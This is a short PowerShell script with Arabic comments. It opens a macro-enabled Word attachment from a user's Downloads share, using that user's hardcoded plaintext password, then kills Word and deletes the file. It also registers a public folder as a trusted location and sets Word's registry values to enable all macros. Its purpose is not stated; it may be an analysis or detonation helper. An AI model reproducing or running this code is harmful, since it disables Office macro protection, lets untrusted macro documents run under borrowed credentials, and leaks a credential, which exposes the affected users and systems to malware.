$Word = "C:\Program Files\Microsoft Office\Office14\WINWORD.EXE"
$File = "\\FILE01\Users$\emily.davis\Downloads\attachment.docm"
$Username = "ASTERA\emily.davis"
$Password = "Ed#2026!R7vN"

$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword)

if (Test-Path $File) {
    $WordProcess = Start-Process -FilePath $Word `
        -ArgumentList "`"$File`"" `
        -Credential $Credential `
        -PassThru `
        -WindowStyle Normal

    Start-Sleep -Seconds 180

    if (-not $WordProcess.HasExited) {
        Stop-Process -Id $WordProcess.Id -Force
    }

    # حذف الملف
    if (Test-Path $File) {
        Remove-Item $File -Force
    }
}


# تعيين المجلد كموقع موثوق في Word 2010 (Office 14)
$TrustedPath = "HKCU:\Software\Microsoft\Office\14.0\Word\Security\Trusted Locations\Location1"
New-Item -Path $TrustedPath -Force
Set-ItemProperty -Path $TrustedPath -Name "Path" -Value "C:\Users\Public\Documents\"
Set-ItemProperty -Path $TrustedPath -Name "AllowSubFolders" -Value 1

Start-Process -FilePath "C:\Program Files\Microsoft Office\Office14\WINWORD.EXE" `
              -ArgumentList "C:\Users\Public\Documents\test.docx" `
              -Credential $Credential `
              -WorkingDirectory "C:\Windows\Tasks"


              # تعطيل حماية الماكرو مؤقتاً للمستخدم الحالي
$RegPath = "HKCU:\Software\Microsoft\Office\14.0\Word\Security"
Set-ItemProperty -Path $RegPath -Name "VBAWarnings" -Value 1  # 1 = تمكين جميع الماكرو
Set-ItemProperty -Path $RegPath -Name "Level" -Value 1       # 1 = منخفض (تمكين الكل)
